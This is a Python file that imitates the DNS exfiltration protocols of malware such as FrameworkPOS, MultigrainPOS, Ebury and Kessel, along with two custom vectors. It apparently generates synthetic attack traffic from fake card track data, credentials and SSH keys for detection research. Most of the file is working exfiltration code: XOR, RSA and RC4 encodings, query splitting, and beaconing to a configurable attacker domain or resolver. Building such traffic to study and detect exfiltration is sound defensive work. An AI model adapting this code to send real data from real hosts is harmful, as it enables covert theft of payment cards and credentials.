from abc import ABC, abstractmethod
from collections import deque
from math import log2
import asyncio
from faker import Faker
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
import base64
from binascii import crc32
from bitstring import Bits
import datagen
import dns.message
import dns.name
import dns._asyncio_backend
import dns.asyncquery
import dns.asyncresolver
import dns.resolver
import dns.rrset
import dns.rdata
import random
import psutil
import socket
import os

MAX_QNAME_SIZE = 255
MAX_LBL_SIZE = 53

SEND_NO_WAIT = 'send_no_wait'
SEND_WAIT = 'send_wait'
SEND_RESOLVE = 'send_resolve'
SEND_GETHOST = 'send_gethost'

DNS_PORT = 53

DOMAIN = '' # fill with attacker's domain
RECORD_TYPE = '' # fill with queries' record type


def limit_size(func):
    def wrapper(*args, **kwargs):
        while True:
            result = func(*args, **kwargs)
            try:
                dns.name.from_text(result)
            except (dns.name.NameTooLong, dns.name.LabelTooLong):
                continue
            else:
                return result
    return wrapper


class exfil(ABC):
    """
    Base class for exfiltration schemes that use crafted DNS queries.
    """
    @abstractmethod
    def __init__(self, amount, time, method, resolver_addr, random_delay,
                 prepend, udp=True):
        """
        args:
            amount: The amount of DNS queries to send. Not every query transfers (whole) data.
            time: Depending on the value of 'random_delay':
                True -> The time in which the exfiltration will happen
                False -> The constant delay between each exfiltrated data "chunk". Not necessarily between each DNS message sent.
                In seconds.
            method: One of the 'SEND_*' constants from constants.py. They correspond to the same-named methods in this class.
            resolver_addr: If using anything other than SEND_GETHOST, this will be where the DNS queries will be sent to. (port 53)
            random_delay: Determines the meaning of 'time'.
            domain: The domain to append to the data. In some schemes this is significant as the attacker's domain where the DNS will eventually relay the queries.
            record_type: The record type used in the query.
            udp: In some situations this can be used to choose between udp and tcp for DNS
            prepend: If True, the domain will be prepended with a vector-unique character to allow vector identification in a multi-vector traffic.
                     e.g. 'domain.eu' -> 'kdomain.eu' for Kessel
                     This does not apply to Ebury which does not use domains or StealthyVec, which uses its own TLDs which can be used for ID.
        """
        if prepend:
            self.domain = f"{type(self).idchar}{DOMAIN}"
        else:
            self.domain = DOMAIN
        self.record_type = RECORD_TYPE
        if not resolver_addr:
            resolver_addr = dns.resolver.Resolver().nameservers[0]
        self.resolver_addr = resolver_addr
        self.amount = amount
        if random_delay:
            self._gen = self.random_delay(time)
            self.delay = lambda: next(self._gen)
        else:
            self.delay = lambda: time
        self.udp = udp
        self.method_num = method
        self.data = Faker()
        self.custom_data = datagen.custom()


    def random_delay(self, timespan):
        """
        Given a timespan, divides it into variable-sized chunks of timespans;
        returns agenerator that yields the sizes of these timespands.
        """
        miliseconds = False
        if self.amount > timespan:
            miliseconds = True
            timespan *= 1000
        send_cues = sorted([random.randint(0, timespan)
                           for _ in range(self.amount - 2)])
        send_cues.append(timespan)

        def generator():
            previous_cue = 0
            for cue in send_cues:
                result = cue - previous_cue
                if miliseconds:
                    result *= 0.001
                previous_cue = cue
                yield result
            yield 0
        return generator()

    @abstractmethod
    async def call__aux(self):
        """
        This will contain the code that gets executed for exfiltration.
        Conforming to asyncio, it can create multiple tasks and await them.
        """
        pass

    async def __call__(self):
        backend = dns._asyncio_backend.Backend()
        if self.method_num == SEND_NO_WAIT:
            self.sock = await backend.make_socket(socket.AF_INET, socket.SOCK_DGRAM, 0, None, (self.resolver_addr, DNS_PORT))
        elif self.method_num == SEND_RESOLVE:
            self.resolver = await dns.asyncresolver.Resolver()
        self.method = self.__getattribute__(self.method_num)
        await self.call__aux()

    async def send_no_wait(self, qname):
        """
        This method sends the DNS query with a custom QNAME to the designated server.
        Doesn't wait for a response.
        """
        message = dns.message.make_query(qname, self.record_type)
        await dns.asyncquery.send_udp(self.sock, message, (self.resolver_addr, DNS_PORT))

    async def send_wait(self, qname):
        """
        Same as 'send_no_wait' but waits for a response.
        """
        message = dns.message.make_query(qname, self.record_type)
        if self.udp:
            await dns.asyncquery.udp(message, (self.resolver_addr, DNS_PORT))
        else:
            await dns.asyncquery.tcp(message, (self.resolver_addr, DNS_PORT))

    async def send_resolve(self, qname):
        """
        DNSPython's resolver.
        """
        await self.resolver.resolve(qname, self.record_type)

    # no async :(
    async def send_gethost(self, qname):
        socket.gethostbyname(qname)
        await asyncio.sleep(0)


class frameworkpos(exfil):

    idchar = 'f'

    def __init__(self, card_type=None, id_bytesize=4, xor_key=0xf2,
                 proc_nums=2, beacon_delay=300, amount=5000, time=1,
                 method=SEND_GETHOST, resolver_addr=None, random_delay=False, prepend=True):
        """
        args:
            card_type: The type of credit cards to exfiltrate (maestro, mastercard, visa). Value None will choose randomly.
            id_bytesize: The size (in bytes) of the id that gets assigned to the infected machine.
            xor_key: Clear from the name.
            proc_nums: The number of processes to exfiltrate (number of 'alert' messages).
            beacon_delay: The delay between 'beacon' messages.
            amount: The total amount of DNS queries, excluding beacons.
        """
        super().__init__(amount, time, method, resolver_addr, random_delay, prepend)
        self.card_type = card_type
        self.id = hex(random.getrandbits(8 * id_bytesize))[2:]
        self.xor_key = xor_key
        self.proc_names = [proc.info['name']
                           for proc in psutil.process_iter(['name'])][-proc_nums:]
        self.alert_cues = sorted(
            [random.randint(1, self.amount - 1) for _ in range(proc_nums - 1)])
        self.beacon_delay = beacon_delay
        self.hostname = self.data.hostname()
        self.ipv4 = self.data.ipv4()

    def encode(self, text):
        return ''.join(list(map(lambda x: hex(x)[2:], (ord(c) ^ self.xor_key for c in text))))

    """
    The following 3 methods are for the 3 different requests used by FrameworkPOS
    """
    @limit_size
    def beacon(self):
        return f'{self.id}.beacon.{self.encode(self.hostname)}.{self.encode(self.ipv4)}.{self.domain}'

    @limit_size
    def alert(self):
        name = self.proc_names.pop()
        return f'{self.id}.alert.{self.encode(name)}.{self.domain}'

    @limit_size
    def card(self):
        to_send = self.custom_data.track_two(self.card_type)[1:-1].split('=')
        return f'{self.id}.{self.encode(to_send[0])}.{self.encode(to_send[1])}.{self.domain}'

    async def heartbeat(self):
        while self.amount > 0:
            qname = self.beacon()
            await self.method(qname)
            await asyncio.sleep(self.beacon_delay)

    async def exfiltration(self):
        qname = self.alert()  # first alert
        self.amount -= 1
        await self.method(qname)

        while self.amount > 0:
            # check if an alert should be sent
            if self.alert_cues and self.amount <= self.alert_cues[-1]:
                self.alert_cues.pop()
                qname = self.alert()
                self.amount -= 1
                await self.method(qname)
                await asyncio.sleep(self.delay())

            qname = self.card()
            self.amount -= 1
            await self.method(qname)
            await asyncio.sleep(self.delay())

    async def call__aux(self):
        hrtbt = asyncio.create_task(self.heartbeat())
        crds = asyncio.create_task(self.exfiltration())
        await hrtbt
        await asyncio.sleep(self.delay())
        await crds


class multigrainpos(exfil):

    idchar = 'm'

    def __init__(self, public_key, init_delay=60, card_type=None, amount=5000,
                 time=1, method=SEND_GETHOST, resolver_addr=None, random_delay=False, prepend=True):
        """
        args:
            public_key: An RSAPublicKey, should be 1024 bits.
            init_delay: The time between the 'install' message and the first exfiltrated card.
            card_type: Same as in 'frameworkpos'.
            amount: The total amount of messages, including the initial install message
        """
        super().__init__(amount, time, method, resolver_addr, random_delay, prepend)
        self.card_type = card_type
        self.key = public_key
        self.init_delay = init_delay
        self.vsn = self.custom_data.volume_serial_number()
        self.mac = self.data.mac_address()
        self.hostname = self.data.hostname(0)
        self.version = self.data.windows_platform_token().encode('ASCII')

    def encode(self, text: bytes):
        return base64.b32encode(text)

    def encrypt(self, text: bytes):
        return self.key.encrypt(
            text,
            padding.OAEP(
                mgf=padding.MGF1(hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

    """
    http://www.cse.yorku.ca/~oz/hash.html
    """

    def djb2hash(self, text: str):
        hsh = 5381
        for c in text:
            hsh = hsh * 33 + ord(c)
        return hsh & 0xffffffff

    @limit_size
    def install(self):
        mac = self.mac[-14:]
        hashed_data = str(self.djb2hash(self.vsn + mac)).encode('ASCII')
        data = hashed_data + self.hostname.encode('ASCII') + self.version
        data = self.encode(data).decode()
        return f'install.{data}.{self.domain}'

    @limit_size
    def card(self):
        to_send = self.custom_data.track_two(self.card_type).encode('ASCII')
        to_send = self.encrypt(to_send)
        to_send = self.encode(to_send).decode()
        to_send = '.'.join(to_send[i:i+MAX_LBL_SIZE]
                           for i in range(0, len(to_send), MAX_LBL_SIZE))
        return f'log.{to_send}.{self.domain}'

    async def exfiltration(self):
        qname = self.install()
        self.amount -= 1
        await self.method(qname)
        await asyncio.sleep(self.init_delay)

        while self.amount > 0:
            qname = self.card()
            await self.method(qname)
            self.amount -= 1
            await asyncio.sleep(self.delay())

    async def call__aux(self):
        multigrain = asyncio.create_task(self.exfiltration())
        await multigrain


class ebury(exfil):

    idchar = 'e'

    def __init__(self, resolver_addr, xor_key=0x000d5345, key_size=4, amount=5000, time=2,
                 method=SEND_NO_WAIT, random_delay=False):
        """
        args:
            resolver_addr: The attacker's server's address. There is no default here because this exfil method sends direct DNS/UDP messages to the attacker's server.
            xor_key, key_size: clear from name
        """
        super().__init__(amount, time, method, resolver_addr, random_delay, prepend=False)
        self.xor_key = xor_key
        self.key_size = key_size
        self.ip = self.data.ipv4()

    def encode(self, text):
        int_list = list(map(ord, text))
        split_list = [int_list[i:i+self.key_size]
                      for i in range(0, len(text), self.key_size)]

        def concat_bytes(lst):
            result = 0
            for i in range(self.key_size):
                if i >= len(lst):
                    break
                result <<= 8
                result += lst[i]
            return result

        def mask_of_ones(size):
            result = 0
            for _ in range(size):
                result <<= 8
                result += 0xff
            return result

        def hex_cor(n):
            result = hex(n)[2:]
            # if e.g. \t is leading the coded tuple, we add a 0 to maintain consistency in length
            if len(result) % 2:
                result = '0'+result
            return result

        return ''.join(map(hex_cor, ((concat_bytes(seg) ^ self.xor_key) & mask_of_ones(len(seg)) for seg in split_list)))

    # passphrase would practically be same as this
    @limit_size
    def login_inward(self):
        pre_encoded = f'{self.data.user_name()}:{self.data.password()}'
        return f'{self.encode(pre_encoded)}.{self.data.ipv4()}'

    @limit_size
    def login_outward(self):
        pre_encoded = f'{self.data.user_name()}:{self.data.password()}:{self.data.port_number(is_system=True)}'
        return f'{self.encode(pre_encoded)}.{self.data.ipv4()}'

    async def call__aux(self):
        methods = [self.login_inward, self.login_outward]
        while self.amount > 0:
            qname = random.choice(methods)()
            await self.method(qname)
            self.amount -= 1
            await asyncio.sleep(self.delay())


class kessel(exfil):

    idchar = 'k'

    def __init__(self, mini_delay=0, amount=30, time=60, method=SEND_GETHOST, resolver_addr=None, random_delay=False, prepend=True):
        """
        args:
            mini_delay: The delay between the split messages that are exfiltrating the same data.
            amount: The number of eventual DNS messages can be greater due to the splitting.
        """
        super().__init__(amount, time, method, resolver_addr, random_delay, prepend)
        self.mini_delay = mini_delay

    """
    https://en.wikipedia.org/wiki/RC4
    """

    def encrypt(self, text: str):
        key = os.urandom(4)

        def KSA(key):
            S = list(range(256))
            j = 0
            for i in range(256):
                j = (j + S[i] + key[i % 4]) % 256
                S[i], S[j] = S[j], S[i]
            return S

        def PRGA(S):
            i = 0
            j = 0
            while True:
                i = (i + j) % 256
                j = (j + S[i]) % 256
                S[i], S[j] = S[j], S[i]
                yield S[(S[i] + S[j]) % 256]

        ciphertext = b''.join([(ord(c) ^ k).to_bytes(1, 'little')
                              for c, k in zip(text, PRGA(KSA(key)))])
        crc = crc32(ciphertext)
        return ciphertext + crc.to_bytes(4, 'little') + key + b';'

    def encode(self, ciphertext: bytes):
        return ciphertext.hex()

    def password(self):
        return f'ssh:{self.data.hostname(0)}:{self.data.user_name()}:{self.data.password()}:{self.data.user_name()}'

    def key(self):
        return f'sshkey:{self.data.hostname(0)}:{self.data.user_name()}:{self.data.file_name(extension="")}:{self.data.password()}:{self.data.user_name()}'

    def split_names(self, text: str):
        split_sub = [text[i:i+MAX_LBL_SIZE]
                     for i in range(0, len(text), MAX_LBL_SIZE)]
        split_queries = ['.'.join(split_sub[i:i+3])
                         for i in range(0, len(split_sub), 3)]
        return split_queries

    async def call__aux(self):
        data_choice = [self.password, self.key]
        while self.amount > 0:
            text = random.choice(data_choice)()
            encrypted = self.encrypt(text)
            encoded = self.encode(encrypted)
            for qnames in self.split_names(encoded):
                self.amount -= 1
                await self.method(f'{qnames}.{self.domain}')
                await asyncio.sleep(self.mini_delay) 
            await asyncio.sleep(self.delay())


class fastervec(exfil):

    idchar = 'a'

    def __init__(self, udp, resolver_addr, amount=100, time=60, sentences=10, subdomain=None, random_delay=False, prepend=True):
        """
        args:
            udp: Whether to use UDP or TCP for the DNS queries.
            sentences: Number of sentences to generate for each query (Faker's paragraph's `nb_sentences`).
            subdomain: The subdomain to use for the exfiltration queries. If None, one will be picked from [www, login, auth, mail]
        """
        super().__init__(amount, time, SEND_NO_WAIT, resolver_addr, random_delay, prepend, udp=udp)
        self.innocent_string = random.choice(['www', 'login', 'auth', 'mail']) if subdomain is None else subdomain
        self.sentences = sentences

    def encode(self, text: str):
        return base64.b64encode(text.encode('ASCII'))

    def exfiltrate(self, text):
        to_send = self.encode(text).decode()
        split = [to_send[i:i+MAX_QNAME_SIZE]
                 for i in range(0, len(to_send), MAX_QNAME_SIZE)]
        qname = f'{self.innocent_string}.{self.domain}'
        msg = dns.message.make_query(qname, self.record_type)

        for i in range(len(split)):
            msg.additional.append(dns.rrset.from_text(
                f'{self.innocent_string}{i}.{self.domain}', 0, 1, 16, split[i]))

        return msg

    async def call__aux(self):
        if self.udp:
            self.method = dns.asyncquery.udp
        else:
            self.method = dns.asyncquery.tcp

        while self.amount > 0:
            text = self.data.paragraph(nb_sentences=self.sentences)
            msg = self.exfiltrate(text)
            msg.origin = dns.name.Name([b''])
            await self.method(msg, self.resolver_addr)
            await asyncio.sleep(self.delay())
            self.amount -= 1


class stealthyvec(exfil):

    idchar = 'b'

    def __init__(self, domains, words, levels, amount, time, method=SEND_GETHOST, resolver_addr=None, random_delay=False):
        """
        args:
            domains: List of attacker's domains. Preferrably 2^7=128 entries long.
            words: List of meaningful words. Preferrably 2^11=2048 entries long.
            levels: Number of subdomains=words to use to encode data in a single query. Preferrably 3.
        vars:
            D: Number of bits a domain can encode.
            W: Number of bits a single word can encode.
            L: Number of bits a query can transfer. 
        """
        super().__init__(amount, time, method, resolver_addr, random_delay, prepend=False)
        self.domains = domains
        self.words = words
        self.levels = levels
        self.D = int(log2(len(self.domains)))
        self.W = int(log2(len(self.words)))
        self.L = self.W * levels + self.D
    
    def split_chunk(self, bits):
        """
        Split bits into query-length(L) chunks.
        """
        return [bits[i:i+self.L] for i in range(0, len(bits), self.L)]

    def encode_query(self, bits):
        domain_bits, word_bits = bits[:self.D], bits[self.D:]
        word_bits_split = [word_bits[i:i+self.W] for i in range(0, len(word_bits), self.W)]
        words = list(map(lambda bits: self.words[int(bits.bin, 2)], word_bits_split))
        domain = self.domains[int(domain_bits.bin, 2)]
        subdomain = '.'.join(words)
        return f'{subdomain}.{domain}'
    
    async def call__aux(self):
        queue = deque()
        while self.amount > 0:
            if not queue:
                paragraph = self.data.paragraph(nb_sentences=10).encode('ASCII')
                queue.extend(self.split_chunk(Bits(paragraph)))
            query_bits = queue.popleft()
            qname = self.encode_query(query_bits)
            await self.method(qname)
            await asyncio.sleep(self.delay())
            self.amount -= 1

        